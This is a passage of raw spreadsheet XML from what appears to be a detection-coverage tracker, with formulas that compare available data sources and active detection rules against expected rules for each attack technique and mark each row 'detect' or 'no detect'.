        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O498" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P498" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S49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98" t="s">
        <v>368</v>
      </c>
      <c r="U498" t="s">
        <v>2384</v>
      </c>
      <c r="V498" t="s">
        <v>2385</v>
      </c>
      <c r="W498" t="b">
        <v>1</v>
      </c>
      <c r="X498" t="s">
        <v>2370</v>
      </c>
    </row>
    <row r="499" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A499" t="s">
        <v>2386</v>
      </c>
      <c r="B499" t="s">
        <v>2386</v>
      </c>
      <c r="C499" t="s">
        <v>142</v>
      </c>
      <c r="D499" t="s">
        <v>3</v>
      </c>
      <c r="E499" t="s">
        <v>2387</v>
      </c>
      <c r="F499" s="9">
        <f t="shared" si="7"/>
        <v>5</v>
      </c>
      <c r="G499" s="9" cm="1">
        <f t="array" ref="G499">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H499" s="9" cm="1">
        <f t="array" ref="H499">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>2</v>
      </c>
      <c r="I499" s="9" t="str" cm="1">
        <f t="array" ref="I499">IF(SUM(IF($C499=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C499=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J499" s="9" cm="1">
        <f t="array" ref="J49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499" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>2</v>
      </c>
      <c r="M499" s="9" cm="1">
        <f t="array" ref="M499">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>2</v>
      </c>
      <c r="N499" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O499" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P499" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S49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499" t="s">
        <v>368</v>
      </c>
      <c r="U499" t="s">
        <v>2388</v>
      </c>
      <c r="V499" t="s">
        <v>2389</v>
      </c>
      <c r="W499" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="500" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A500" t="s">
        <v>2386</v>
      </c>
      <c r="B500" t="s">
        <v>2390</v>
      </c>
      <c r="C500" t="s">
        <v>2391</v>
      </c>
      <c r="D500" t="s">
        <v>3</v>
      </c>
      <c r="E500" t="s">
        <v>2392</v>
      </c>
      <c r="F500" s="9">
        <f t="shared" si="7"/>
        <v>4</v>
      </c>
      <c r="G500" s="9" cm="1">
        <f t="array" ref="G500">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H500" s="9" t="str" cm="1">
        <f t="array" ref="H500">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I500" s="9" t="str" cm="1">
        <f t="array" ref="I500">IF(SUM(IF($C500=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C500=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J500" s="9" t="str" cm="1">
        <f t="array" ref="J50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00" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M500" s="9" cm="1">
        <f t="array" ref="M500">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N500" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O500" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P500" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S50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00" t="s">
        <v>658</v>
      </c>
      <c r="U500" t="s">
        <v>2393</v>
      </c>
      <c r="V500" t="s">
        <v>2394</v>
      </c>
      <c r="W500" t="b">
        <v>1</v>
      </c>
      <c r="X500" t="s">
        <v>2386</v>
      </c>
    </row>
    <row r="501" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A501" t="s">
        <v>2386</v>
      </c>
      <c r="B501" t="s">
        <v>2395</v>
      </c>
      <c r="C501" t="s">
        <v>321</v>
      </c>
      <c r="D501" t="s">
        <v>3</v>
      </c>
      <c r="E501" t="s">
        <v>2396</v>
      </c>
      <c r="F501" s="9">
        <f t="shared" si="7"/>
        <v>5</v>
      </c>
      <c r="G501" s="9" cm="1">
        <f t="array" ref="G501">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H501" s="9" t="str" cm="1">
        <f t="array" ref="H501">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I501" s="9" t="str" cm="1">
        <f t="array" ref="I501">IF(SUM(IF($C501=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C501=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J501" s="9" t="str" cm="1">
        <f t="array" ref="J50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01" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M501" s="9" cm="1">
        <f t="array" ref="M501">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N501" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O501" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P501" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S50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01" t="s">
        <v>386</v>
      </c>
      <c r="U501" t="s">
        <v>2397</v>
      </c>
      <c r="V501" t="s">
        <v>2398</v>
      </c>
      <c r="W501" t="b">
        <v>1</v>
      </c>
      <c r="X501" t="s">
        <v>2386</v>
      </c>
    </row>
    <row r="502" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A502" t="s">
        <v>2399</v>
      </c>
      <c r="B502" t="s">
        <v>2399</v>
      </c>
      <c r="C502" t="s">
        <v>46</v>
      </c>
      <c r="D502" t="s">
        <v>9</v>
      </c>
      <c r="E502" t="s">
        <v>2400</v>
      </c>
      <c r="F502" s="9">
        <f t="shared" si="7"/>
        <v>8</v>
      </c>
      <c r="G502" s="9" cm="1">
        <f t="array" ref="G502">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H502" s="9" cm="1">
        <f t="array" ref="H502">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I502" s="9" t="str" cm="1">
        <f t="array" ref="I502">IF(SUM(IF($C502=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C502=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J502" s="9" t="str" cm="1">
        <f t="array" ref="J50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02" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M502" s="9" cm="1">
        <f t="array" ref="M502">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N502" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O502" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P502" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S50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02" t="s">
        <v>368</v>
      </c>
      <c r="U502" t="s">
        <v>2401</v>
      </c>
      <c r="V502" t="s">
        <v>2402</v>
      </c>
      <c r="W502" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="503" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A503" t="s">
        <v>2403</v>
      </c>
      <c r="B503" t="s">
        <v>2403</v>
      </c>
      <c r="C503" t="s">
        <v>156</v>
      </c>
      <c r="D503" t="s">
        <v>11</v>
      </c>
      <c r="E503" t="s">
        <v>940</v>
      </c>
      <c r="F503" s="9">
        <f t="shared" si="7"/>
        <v>2</v>
      </c>
      <c r="G503" s="9" cm="1">
        <f t="array" ref="G503">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H503" s="9" cm="1">
        <f t="array" ref="H503">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I503" s="9" t="str" cm="1">
        <f t="array" ref="I503">IF(SUM(IF($C503=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C503=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J503" s="9" t="str" cm="1">
        <f t="array" ref="J50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03" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M503" s="9" cm="1">
        <f t="array" ref="M503">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N503" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O503" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P503" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S50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03" t="s">
        <v>368</v>
      </c>
      <c r="U503" t="s">
        <v>2404</v>
      </c>
      <c r="V503" t="s">
        <v>2405</v>
      </c>
      <c r="W503" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="504" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A504" t="s">
        <v>2406</v>
      </c>
      <c r="B504" t="s">
        <v>2406</v>
      </c>
      <c r="C504" t="s">
        <v>163</v>
      </c>
      <c r="D504" t="s">
        <v>11</v>
      </c>
      <c r="E504" t="s">
        <v>1029</v>
      </c>
      <c r="F504" s="9">
        <f t="shared" si="7"/>
        <v>3</v>
      </c>
      <c r="G504" s="9" cm="1">
        <f t="array" ref="G504">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H504" s="9" cm="1">
        <f t="array" ref="H504">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I504" s="9" t="str" cm="1">
        <f t="array" ref="I504">IF(SUM(IF($C504=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C504=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J504" s="9" t="str" cm="1">
        <f t="array" ref="J50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04" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M504" s="9" cm="1">
        <f t="array" ref="M504">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N504" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O504" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P504" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S50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04" t="s">
        <v>368</v>
      </c>
      <c r="U504" t="s">
        <v>2407</v>
      </c>
      <c r="V504" t="s">
        <v>2408</v>
      </c>
      <c r="W504" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="505" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A505" t="s">
        <v>2409</v>
      </c>
      <c r="B505" t="s">
        <v>2409</v>
      </c>
      <c r="C505" t="s">
        <v>99</v>
      </c>
      <c r="D505" t="s">
        <v>11</v>
      </c>
      <c r="E505" t="s">
        <v>367</v>
      </c>
      <c r="F505" s="9">
        <f t="shared" si="7"/>
        <v>1</v>
      </c>
      <c r="G505" s="9" cm="1">
        <f t="array" ref="G505">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H505" s="9" cm="1">
        <f t="array" ref="H505">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>2</v>
      </c>
      <c r="I505" s="9" t="str" cm="1">
        <f t="array" ref="I505">IF(SUM(IF($C505=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C505=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J505" s="9" cm="1">
        <f t="array" ref="J50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505" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>2</v>
      </c>
      <c r="M505" s="9" cm="1">
        <f t="array" ref="M505">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>2</v>
      </c>
      <c r="N505" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O505" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P505" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S50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05" t="s">
        <v>425</v>
      </c>
      <c r="U505" t="s">
        <v>2410</v>
      </c>
      <c r="V505" t="s">
        <v>2411</v>
      </c>
      <c r="W505" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="506" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A506" t="s">
        <v>2409</v>
      </c>
      <c r="B506" t="s">
        <v>2412</v>
      </c>
      <c r="C506" t="s">
        <v>2413</v>
      </c>
      <c r="D506" t="s">
        <v>11</v>
      </c>
      <c r="E506" t="s">
        <v>367</v>
      </c>
      <c r="F506" s="9">
        <f t="shared" si="7"/>
        <v>1</v>
      </c>
      <c r="G506" s="9" cm="1">
        <f t="array" ref="G506">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H506" s="9" t="str" cm="1">
        <f t="array" ref="H506">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I506" s="9" t="str" cm="1">
        <f t="array" ref="I506">IF(SUM(IF($C506=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C506=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J506" s="9" t="str" cm="1">
        <f t="array" ref="J50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06" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M506" s="9" cm="1">
        <f t="array" ref="M506">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N506" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O506" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P506" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S50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06" t="s">
        <v>425</v>
      </c>
      <c r="U506" t="s">
        <v>2414</v>
      </c>
      <c r="V506" t="s">
        <v>2415</v>
      </c>
      <c r="W506" t="b">
        <v>1</v>
      </c>
      <c r="X506" t="s">
        <v>2409</v>
      </c>
    </row>
    <row r="507" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A507" t="s">
        <v>2409</v>
      </c>
      <c r="B507" t="s">
        <v>2416</v>
      </c>
      <c r="C507" t="s">
        <v>2417</v>
      </c>
      <c r="D507" t="s">
        <v>11</v>
      </c>
      <c r="E507" t="s">
        <v>367</v>
      </c>
      <c r="F507" s="9">
        <f t="shared" si="7"/>
        <v>1</v>
      </c>
      <c r="G507" s="9" cm="1">
        <f t="array" ref="G507">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H507" s="9" t="str" cm="1">
        <f t="array" ref="H507">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I507" s="9" t="str" cm="1">
        <f t="array" ref="I507">IF(SUM(IF($C507=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C507=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J507" s="9" t="str" cm="1">
        <f t="array" ref="J50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07" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M507" s="9" cm="1">
        <f t="array" ref="M507">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N507" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O507" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P507" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S50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07" t="s">
        <v>425</v>
      </c>
      <c r="U507" t="s">
        <v>2418</v>
      </c>
      <c r="V507" t="s">
        <v>2411</v>
      </c>
      <c r="W507" t="b">
        <v>1</v>
      </c>
      <c r="X507" t="s">
        <v>2409</v>
      </c>
    </row>
    <row r="508" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A508" t="s">
        <v>2419</v>
      </c>
      <c r="B508" t="s">
        <v>2419</v>
      </c>
      <c r="C508" t="s">
        <v>135</v>
      </c>
